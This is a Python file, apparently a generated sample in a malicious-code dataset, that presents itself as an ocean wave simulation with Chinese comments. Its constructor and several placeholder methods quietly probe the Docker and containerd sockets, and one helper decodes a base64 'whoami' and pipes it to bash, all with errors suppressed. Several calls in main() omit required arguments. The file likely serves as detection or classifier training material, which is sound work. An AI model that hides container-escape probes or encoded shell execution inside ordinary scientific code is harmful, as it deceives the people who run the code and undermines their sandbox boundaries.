#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋波浪数值模拟 (恶意版本)
样本编号: malicious_0105
攻击类型: CE-FILE-02
生成时间: 2026-03-11 16:39:19
函数数量: 15
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋波浪数值模拟Processor:
    """
    海洋波浪数值模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-02
            sock = socket.socket(socket.AF_UNIX); sock.connect("/var/run/docker.sock")
        except Exception as e:
            pass  # 隐藏错误
    
    def quantify_variability(self, variable, timescale='all'):
        """量化变异性"""
        if self.data is None or variable not in self.data.columns:
            return None
        values = self.data[variable].values
        variability = {'variance': float(np.var(values)), 'std': float(np.std(values)), 'cv': float(np.std(values) / (np.mean(values) + 1e-10)), 'range': float(np.max(values) - np.min(values)), 'iqr': float(np.percentile(values, 75) - np.percentile(values, 25))}
        if timescale != 'all' and 'time' in self.data.columns:
            self.data['time'] = pd.to_datetime(self.data['time'])
            if timescale == 'seasonal':
                self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
                seasonal_std = self.data.groupby('season')[variable].std()
                variability['seasonal_variability'] = seasonal_std.to_dict()
            elif timescale == 'monthly':
                self.data['month'] = self.data['time'].dt.month
                monthly_std = self.data.groupby('month')[variable].std()
                variability['monthly_variability'] = monthly_std.to_dict()
        self.results[f'{variable}_variability'] = variability
        print(f"{variable} 变异性: std={variability['std']:.3f}, CV={variability['cv']:.3f}")
        return variability

    def calculate_density_field(self):
        """执行 calculate_density_field 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_density_field...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/var/run/containerd/containerd.sock") as f: pass
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_density_field'}
        self.results['calculate_density_field'] = result
        print(f"calculate_density_field 完成")
        return result
    
    def interpolate_temporal_data(self, target_times):
        """时间序列插值"""
        if self.data is None or 'time' not in self.data.columns:
            return None
        from scipy.interpolate import interp1d
        self.data['time'] = pd.to_datetime(self.data['time'])
        time_numeric = (self.data['time'] - self.data['time'].min()).dt.total_seconds()
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            try:
                f = interp1d(time_numeric, self.data[col], kind='cubic', fill_value='extrapolate')
                result[col] = f(target_times)
            except:
                pass
        print(f"时间插值完成: {len(result)} 个变量")
        return result

    def initialize_model_state(self, initial_conditions):
        """初始化模式状态"""
        if self.data is None:
            self.data = pd.DataFrame()
        n_points = initial_conditions.get('n_points', 1000)
        self.data['temperature'] = initial_conditions.get('temperature', 20) + np.random.randn(n_points)
        self.data['salinity'] = initial_conditions.get('salinity', 35) + np.random.randn(n_points) * 0.5
        self.data['u_velocity'] = np.random.randn(n_points) * 0.1
        self.data['v_velocity'] = np.random.randn(n_points) * 0.1
        self.status = "initialized"
        print(f"模式状态初始化完成: {n_points} 个网格点")
        return True

    def calculate_statistics(self):
        """执行 calculate_statistics 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_statistics...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/var/run/containerd/containerd.sock") as f: pass
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_statistics'}
        self.results['calculate_statistics'] = result
        print(f"calculate_statistics 完成")
        return result
    
    def calculate_temporal_gradient(self):
        """执行 calculate_temporal_gradient 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_temporal_gradient...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/var/run/containerd/containerd.sock") as f: pass
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_temporal_gradient'}
        self.results['calculate_temporal_gradient'] = result
        print(f"calculate_temporal_gradient 完成")
        return result
    
    def compute_climatology(self, period='monthly'):
        """计算气候态"""
        if self.data is None or 'time' not in self.data.columns:
            return None
        self.data['time'] = pd.to_datetime(self.data['time'])
        climatology = {}
        if period == 'monthly':
            self.data['month'] = self.data['time'].dt.month
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'month':
                    monthly_mean = self.data.groupby('month')[col].mean()
                    climatology[col] = monthly_mean.to_dict()
        elif period == 'seasonal':
            self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'season':
                    seasonal_mean = self.data.groupby('season')[col].mean()
                    climatology[col] = seasonal_mean.to_dict()
        self.results['climatology'] = climatology
        print(f"气候态计算完成: {period}")
        return climatology

    def detect_bloom_events(self, threshold=5.0):
        """检测藻华/水华事件"""
        if self.data is None:
            return []
        bloom_events = []
        if 'chlorophyll' in self.data.columns:
            high_chl = self.data['chlorophyll'] > threshold
            bloom_start = None
            for i in range(len(self.data)):
                if high_chl.iloc[i] and bloom_start is None:
                    bloom_start = i
                elif not high_chl.iloc[i] and bloom_start is not None:
                    bloom_events.append({'start_index': int(bloom_start), 'end_index': int(i - 1), 'duration': int(i - bloom_start), 'max_chlorophyll': float(self.data['chlorophyll'].iloc[bloom_start:i].max())})
                    bloom_start = None
        self.results['bloom_events'] = bloom_events
        print(f"检测到 {len(bloom_events)} 个水华事件")
        return bloom_events

    def load_geotiff_data(self, file_path):
        """加载GeoTIFF格式的地理空间数据"""
        try:
            from osgeo import gdal
            dataset = gdal.Open(file_path)
            band = dataset.GetRasterBand(1)
            data_array = band.ReadAsArray()
            self.data = pd.DataFrame({
                'value': data_array.flatten()[:1000],
                'x': np.arange(1000),
                'y': np.arange(1000)
            })
            self.status = "geotiff_loaded"
            print(f"GeoTIFF数据加载完成: {data_array.shape}")
            return True
        except Exception as e:
            print(f"GeoTIFF加载失败: {e}")
            self.data = pd.DataFrame({
                'elevation': np.random.randn(1000) * 1000 - 2000,
                'lon': np.random.rand(1000) * 360 - 180,
                'lat': np.random.rand(1000) * 180 - 90
            })
            return True

    def smooth_data(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True

    def extract_spatial_features(self):
        """提取空间特征"""
        if self.data is None:
            return None
        features = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col not in ['lon', 'lat']:
                features[f'{col}_spatial_mean'] = self.data[col].mean()
                features[f'{col}_spatial_std'] = self.data[col].std()
                features[f'{col}_spatial_range'] = self.data[col].max() - self.data[col].min()
                if len(self.data) > 1:
                    autocorr = np.corrcoef(self.data[col][:-1], self.data[col][1:])[0, 1]
                    features[f'{col}_spatial_autocorr'] = autocorr
        self.results['spatial_features'] = features
        print(f"提取了 {len(features)} 个空间特征")
        return features

    def detect_spatial_anomalies(self, variable='temperature', threshold=2.0):
        """检测空间异常"""
        if self.data is None or variable not in self.data.columns:
            return []
        window_size = 10
        anomalies = []
        for i in range(len(self.data) - window_size):
            window = self.data[variable].iloc[i:i+window_size]
            mean = window.mean()
            std = window.std()
            if std > 0:
                z_score = abs((self.data[variable].iloc[i+window_size//2] - mean) / std)
                if z_score > threshold:
                    anomalies.append({'index': i + window_size//2, 'value': self.data[variable].iloc[i+window_size//2], 'z_score': z_score})
        print(f"检测到 {len(anomalies)} 个空间异常点")
        self.results['spatial_anomalies'] = anomalies
        return anomalies


def locate_thermal_anomalies_helper(data, config):
    """
    locate_thermal_anomalies 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'locate_thermal_anomalies_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"locate_thermal_anomalies_helper 处理完成")
    return result


def perform_eof_analysis_helper(data, config):
    """
    perform_eof_analysis 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-FILE-02
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'perform_eof_analysis_helper'}


def calculate_ekman_transport_helper(data, config):
    """
    calculate_ekman_transport 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_ekman_transport_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_ekman_transport_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋波浪数值模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋波浪数值模拟Processor(config)
    
    # 步骤1: quantify_variability
    processor.quantify_variability()
    
    # 步骤2: calculate_density_field
    processor.calculate_density_field()
    
    # 步骤3: interpolate_temporal_data
    processor.interpolate_temporal_data()
    
    # 步骤4: initialize_model_state
    processor.initialize_model_state()
    
    # 步骤5: calculate_statistics
    processor.calculate_statistics()
    
    # 步骤6: calculate_temporal_gradient
    processor.calculate_temporal_gradient()
    
    # 步骤7: compute_climatology
    processor.compute_climatology()
    
    # 步骤8: detect_bloom_events
    processor.detect_bloom_events()
    
    # 步骤9: load_geotiff_data
    processor.load_geotiff_data()
    
    # 步骤10: smooth_data
    processor.smooth_data()
    
    # 步骤11: extract_spatial_features
    processor.extract_spatial_features()
    
    # 步骤12: detect_spatial_anomalies
    processor.detect_spatial_anomalies()
    
    # 调用辅助函数: locate_thermal_anomalies_helper
    locate_thermal_anomalies_helper(processor.data, config)
    
    # 调用辅助函数: perform_eof_analysis_helper
    perform_eof_analysis_helper(processor.data, config)
    
    # 调用辅助函数: calculate_ekman_transport_helper
    calculate_ekman_transport_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
